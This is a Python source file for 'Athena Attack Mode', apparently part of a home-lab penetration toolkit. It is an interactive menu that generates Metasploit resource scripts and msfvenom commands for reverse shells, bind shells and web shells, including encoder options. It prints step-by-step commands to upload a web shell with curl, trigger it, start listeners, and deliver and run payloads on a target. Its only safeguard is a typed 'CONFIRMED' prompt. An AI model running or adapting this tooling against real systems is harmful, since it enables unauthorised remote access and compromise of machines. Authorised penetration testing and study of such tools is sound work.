#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════╗
║         A T H E N A  —  A T T A C K  M O D E         ║
║     Controlled Exploitation & Payload Generation      ║
║         Authorised home lab use only                  ║
╚═══════════════════════════════════════════════════════╝

Linux/cross-platform compatible.
Run with:  python3 attack.py
"""

import sys
import os
import json
import datetime

# ─── Path Resolution ─────────────────────────────────────────────────────────
# Anchored to the file's own directory so imports work whether the script is
# run as `python3 attack.py` (from the project dir) or as an absolute path
# e.g. `python3 /opt/athena/attack.py` from anywhere on Linux.
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _BASE_DIR)

from attack_payloads import PayloadBuilder
from attack_reporter import AttackReporter
from validators import (
    validate_ip, validate_port, validate_msf_module,
    validate_encoder, validate_iterations, sanitise_filename,
    prompt_validated, CYAN, YELLOW, GREEN, RED, GREY, RESET,
    COLOUR
)

# ─── Colour Helpers ───────────────────────────────────────────────────────────

PURPLE = "\033[95m" if COLOUR else ""

# ─── Directories ─────────────────────────────────────────────────────────────

REPORTS_DIR = os.path.join(_BASE_DIR, "reports")
RC_DIR      = os.path.join(_BASE_DIR, "rc_scripts")

# ─── Banner & Menu ───────────────────────────────────────────────────────────

BANNER = f"""
{PURPLE}
  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ███████║   ██║      ██║   ███████║██║     █████╔╝ 
 ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
 ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
 ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              M O D E  v1.0
{RESET}
{YELLOW}  [!] Authorised targets only. Target lock enforced.
  [!] Generated scripts are for lab use only.{RESET}
"""

MAIN_MENU = f"""
{PURPLE}┌──────────────────────────────────────────────┐
│           ATTACK MODE — PAYLOAD TYPE         │
├──────────────────────────────────────────────┤
│  [1]  Meterpreter Reverse Shell              │
│  [2]  Bind Shell                             │
│  [3]  Web Shell  (HTTP targets)              │
│  [4]  Custom Payload  (msfvenom)             │
│  [5]  Load from Chase session                │
│  [6]  View generated RC scripts              │
│  [0]  Exit                                   │
└──────────────────────────────────────────────┘{RESET}
"""

# ─── Target Lock ─────────────────────────────────────────────────────────────

def target_lock(target):
    print(f"\n{PURPLE}╔══════════════════════════════════════════════╗")
    print(f"║  ⚠  TARGET LOCK REQUIRED                    ║")
    print(f"║     Target : {target:<32}║")
    print(f"╚══════════════════════════════════════════════╝{RESET}")
    print(f"{YELLOW}  Confirm you OWN or have WRITTEN permission")
    print(f"  to exploit this machine. Lab use only.{RESET}\n")
    ans = input("  Type CONFIRMED to lock and continue: ").strip()
    if ans.upper() == "CONFIRMED":
        print(f"{GREEN}[✓]  Target locked → {target}{RESET}\n")
        return True
    print(f"{RED}[-]  Target lock not confirmed. Aborting.{RESET}\n")
    return False

# ─── Session Loaders ─────────────────────────────────────────────────────────

def _load_latest_json(prefix):
    """Load the most recent JSON session file matching a prefix."""
    if not os.path.isdir(REPORTS_DIR):
        return None
    jsons = sorted(
        [f for f in os.listdir(REPORTS_DIR) if f.startswith(prefix) and f.endswith(".json")],
        reverse=True
    )
    if not jsons:
        return None
    path = os.path.join(REPORTS_DIR, jsons[0])
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError) as e:
        print(f"{YELLOW}[!]  Could not load session {jsons[0]}: {e}{RESET}")
        return None

def load_chase_session():
    return _load_latest_json("chase_")

def load_athena_session():
    return _load_latest_json("athena_")

# ─── Input Helpers ────────────────────────────────────────────────────────────

def prompt(label, default=""):
    val = input(f"{PURPLE}[?]  {label}{' ['+default+']' if default else ''}: {RESET}").strip()
    return val if val else default

def select_os():
    print(f"\n{PURPLE}  Target OS:{RESET}")
    print("  [1] Windows x64   [2] Windows x86")
    print("  [3] Linux x64     [4] Linux x86")
    choice = input(f"{PURPLE}[?]  Choice [1]: {RESET}").strip() or "1"
    return {"1":"windows/x64","2":"windows/x86","3":"linux/x86_64","4":"linux/x86"}.get(choice,"windows/x64")

def select_exploit_from_chase(vulns):
    if not vulns:
        print(f"{YELLOW}[!]  No vulnerabilities in Chase session.{RESET}")
        return None
    print(f"\n{PURPLE}  Vulnerabilities from Chase session:{RESET}\n")
    for i, v in enumerate(vulns, 1):
        sev = v.get("severity","?")
        print(f"  [{i}]  {v.get('id','?'):<10} {sev:<10} {v.get('vulnerability','?')[:50]}")
        print(f"       MSF: {GREY}{v.get('msf_module','N/A')}{RESET}")
    choice = input(f"\n{PURPLE}[?]  Select vulnerability [1-{len(vulns)}]: {RESET}").strip()
    try:
        idx = int(choice) - 1
        return vulns[idx]
    except Exception:
        return None

# ─── Payload Flows ────────────────────────────────────────────────────────────

def flow_meterpreter(builder, reporter, target):
    print(f"\n{PURPLE}── Meterpreter Reverse Shell ──────────────────{RESET}\n")
    lhost     = prompt_validated("Your listener IP (LHOST)", validate_ip, "192.168.1.100", PURPLE)
    lport     = prompt_validated("Listener port (LPORT)", validate_port, "4444", PURPLE)
    target_os = select_os()
    exploit   = prompt_validated("Metasploit exploit module", validate_msf_module,
                                 "exploit/multi/handler", PURPLE)
    rc   = builder.meterpreter_reverse(target, lhost, str(lport), target_os, exploit)
    path = reporter.save_rc("meterpreter_reverse", rc)
    reporter.log_attempt("Meterpreter Reverse", target, lhost, str(lport), target_os, exploit, path)
    _print_rc_instructions(path, lhost, lport)

def flow_bind(builder, reporter, target):
    print(f"\n{PURPLE}── Bind Shell ──────────────────────────────────{RESET}\n")
    lport     = prompt_validated("Bind port on target", validate_port, "4444", PURPLE)
    target_os = select_os()
    exploit   = prompt_validated("Metasploit exploit module", validate_msf_module,
                                 "exploit/multi/handler", PURPLE)
    rc   = builder.bind_shell(target, str(lport), target_os, exploit)
    path = reporter.save_rc("bind_shell", rc)
    reporter.log_attempt("Bind Shell", target, target, str(lport), target_os, exploit, path)
    _print_rc_instructions(path, target, lport)

def flow_webshell(builder, reporter, target):
    print(f"\n{PURPLE}── Web Shell ───────────────────────────────────{RESET}\n")
    port       = prompt_validated("Target web port", validate_port, "80", PURPLE)
    webroot    = prompt("Remote web root path", "/var/www/html")
    shell_type = input(f"{PURPLE}[?]  Shell type [php/aspx/jsp] (php): {RESET}").strip().lower() or "php"
    if shell_type not in ["php", "aspx", "jsp"]:
        print(f"{YELLOW}[!]  Unknown shell type — defaulting to php.{RESET}")
        shell_type = "php"
    lhost = prompt_validated("Your listener IP (LHOST)", validate_ip, "192.168.1.100", PURPLE)
    lport = prompt_validated("Listener port (LPORT)", validate_port, "4444", PURPLE)
    rc, shell_code, filename = builder.web_shell(target, str(port), webroot, shell_type,
                                                  lhost, str(lport))
    shell_path = reporter.save_shell(filename, shell_code)
    rc_path    = reporter.save_rc("web_shell", rc)
    reporter.log_attempt("Web Shell", target, lhost, str(lport), shell_type,
                          f"port:{port}", rc_path)
    _print_webshell_instructions(shell_path, rc_path, filename, target, str(port), webroot)

def flow_msfvenom(builder, reporter, target):
    print(f"\n{PURPLE}── Custom Payload (msfvenom) ────────────────────{RESET}\n")
    print("  Payload formats available:")
    print("  [1] Windows EXE      [2] Linux ELF")
    print("  [3] Python script    [4] PowerShell")
    print("  [5] PHP webshell     [6] Raw shellcode (C)")
    fmt_choice = input(f"{PURPLE}[?]  Format [1]: {RESET}").strip() or "1"
    fmt_map    = {"1":"exe","2":"elf","3":"py","4":"ps1","5":"php","6":"c"}
    fmt        = fmt_map.get(fmt_choice, "exe")

    target_os = select_os()
    lhost     = prompt_validated("Your listener IP (LHOST)", validate_ip, "192.168.1.100", PURPLE)
    lport     = prompt_validated("Listener port (LPORT)", validate_port, "4444", PURPLE)

    raw_out = prompt("Output filename", f"payload.{fmt}")
    outfile = sanitise_filename(raw_out)
    if outfile != raw_out:
        print(f"{YELLOW}[!]  Filename sanitised: '{raw_out}' → '{outfile}'{RESET}")

    raw_enc = prompt("Encoder (optional, e.g. x86/shikata_ga_nai)", "")
    ok, encoder = validate_encoder(raw_enc)
    if not ok:
        print(f"{YELLOW}[!]  {encoder} — encoder skipped.{RESET}")
        encoder = ""

    if encoder:
        raw_iter = prompt("Encoding iterations", "1")
        ok, iterations = validate_iterations(raw_iter)
        if not ok:
            print(f"{YELLOW}[!]  {iterations} — defaulting to 1.{RESET}")
            iterations = 1
    else:
        iterations = 1

    cmd, rc = builder.msfvenom_payload(target_os, lhost, str(lport), fmt, outfile,
                                        encoder, str(iterations))
    rc_path = reporter.save_rc("msfvenom_handler", rc)
    reporter.log_attempt("msfvenom", target, lhost, str(lport), target_os, fmt, rc_path)
    _print_msfvenom_instructions(cmd, rc_path, outfile, lhost, lport)

def flow_from_chase(builder, reporter, target):
    print(f"\n{PURPLE}── Load from Chase Session ─────────────────────{RESET}\n")
    session = load_chase_session()
    if not session:
        print(f"{YELLOW}[!]  No Chase session found. Run chase.py first.{RESET}")
        return

    vulns = session.get("vulns", [])
    vuln  = select_exploit_from_chase(vulns)
    if not vuln:
        print(f"{RED}[-]  No vulnerability selected.{RESET}")
        return

    lhost     = prompt_validated("Your listener IP (LHOST)", validate_ip, "192.168.1.100", PURPLE)
    lport     = prompt_validated("Listener port (LPORT)", validate_port, "4444", PURPLE)
    target_os = select_os()

    rc   = builder.from_vuln(vuln, target, lhost, lport, target_os)
    path = reporter.save_rc(f"chase_{vuln.get('id','vuln')}", rc)
    reporter.log_attempt(
        vuln.get("vulnerability","Chase exploit"),
        target, lhost, lport, target_os,
        vuln.get("msf_module",""), path
    )
    _print_rc_instructions(path, lhost, lport)

# ─── Instruction Printers ─────────────────────────────────────────────────────

def _print_rc_instructions(path, lhost, lport):
    print(f"\n{GREEN}[✓]  RC script saved: {path}{RESET}")
    print(f"\n{PURPLE}  To execute in Metasploit:{RESET}")
    print(f"{YELLOW}    msfconsole -r \"{path}\"{RESET}")
    print(f"\n{PURPLE}  Or from inside msfconsole:{RESET}")
    print(f"{YELLOW}    resource \"{path}\"{RESET}")
    print(f"\n{GREY}  Listener: {lhost}:{lport}{RESET}\n")

def _print_webshell_instructions(shell_path, rc_path, filename, target, port, webroot):
    print(f"\n{GREEN}[✓]  Web shell saved : {shell_path}{RESET}")
    print(f"{GREEN}[✓]  Handler RC saved : {rc_path}{RESET}")
    print(f"\n{PURPLE}  Upload the shell file to the target:{RESET}")
    print(f"{YELLOW}    curl -F 'file=@{shell_path}' http://{target}:{port}/upload{RESET}")
    print(f"{YELLOW}    # Or via FTP/SMB/LFI depending on access vector{RESET}")
    print(f"\n{PURPLE}  Then start the handler:{RESET}")
    print(f"{YELLOW}    msfconsole -r \"{rc_path}\"{RESET}")
    print(f"\n{PURPLE}  Trigger the shell:{RESET}")
    print(f"{YELLOW}    curl http://{target}:{port}/{filename}{RESET}\n")

def _print_msfvenom_instructions(cmd, rc_path, outfile, lhost, lport):
    print(f"\n{PURPLE}  Generate the payload:{RESET}")
    print(f"{YELLOW}    {cmd}{RESET}")
    print(f"\n{PURPLE}  Start the listener:{RESET}")
    print(f"{YELLOW}    msfconsole -r \"{rc_path}\"{RESET}")
    print(f"\n{PURPLE}  Deliver {outfile} to target and execute it.{RESET}")
    print(f"{GREY}  Listener: {lhost}:{lport}{RESET}\n")

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    # Python 3.8+ check
    if sys.version_info < (3, 8):
        print("[-]  Python 3.8 or higher is required.")
        sys.exit(1)

    print(BANNER)
    os.makedirs(RC_DIR, exist_ok=True)
    os.makedirs(REPORTS_DIR, exist_ok=True)

    raw_target = input(f"{PURPLE}[?]  Enter target IP (or press Enter to load from Athena session): {RESET}").strip()
    if not raw_target:
        session = load_athena_session()
        if session:
            ok, result = validate_ip(session.get("target", ""))
            if ok:
                raw_target = result
                print(f"{GREEN}[✓]  Loaded target from Athena session: {raw_target}{RESET}")

    if not raw_target:
        raw_target = prompt_validated(
            "Target IP required (no default — must be explicit)",
            validate_ip,
            color=PURPLE
        )
    else:
        ok, result = validate_ip(raw_target)
        if not ok:
            print(f"{RED}[-]  Invalid target: {result}{RESET}")
            sys.exit(1)
        raw_target = result

    target = raw_target

    if not target_lock(target):
        sys.exit(0)

    builder  = PayloadBuilder()
    reporter = AttackReporter(target)

    while True:
        print(MAIN_MENU)
        choice = input(f"{PURPLE}[?]  Choice: {RESET}").strip()

        if choice == "0":
            reporter.save_session()
            print(f"{GREEN}[✓]  Attack session saved. Stay ethical.{RESET}\n")
            sys.exit(0)
        elif choice == "1":
            flow_meterpreter(builder, reporter, target)
        elif choice == "2":
            flow_bind(builder, reporter, target)
        elif choice == "3":
            flow_webshell(builder, reporter, target)
        elif choice == "4":
            flow_msfvenom(builder, reporter, target)
        elif choice == "5":
            flow_from_chase(builder, reporter, target)
        elif choice == "6":
            reporter.list_rc_scripts()
        else:
            print(f"{RED}[-]  Invalid choice.{RESET}")

if __name__ == "__main__":
    main()
